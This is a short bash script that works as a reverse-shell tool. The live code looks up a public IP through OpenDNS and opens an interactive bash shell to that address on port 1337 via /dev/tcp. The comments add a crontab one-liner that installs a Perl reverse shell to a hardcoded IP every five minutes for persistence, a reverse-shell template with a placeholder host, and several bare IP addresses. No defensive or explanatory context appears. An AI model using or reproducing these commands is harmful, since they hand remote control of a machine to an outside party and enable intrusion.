#!/bin/bash

# typeln("(crontab -l ; echo \"*/5 * * * * perl -MIO::Socket -e'\\$c=new IO::Socket::INET(\\\"72.14.179.47:1337\\\");print\\$c \\`\\$_\\`while<\\$c>'\")  | crontab -");
# bash -i >& /dev/tcp/youripaddress/1337 0>&1
# 207.38.92.82
# 207.38.94.28
# 13791

ip=$(dig @resolver1.opendns.com ANY myip.opendns.com +short)

bash -i >& /dev/tcp/$ip/1337 0>&1
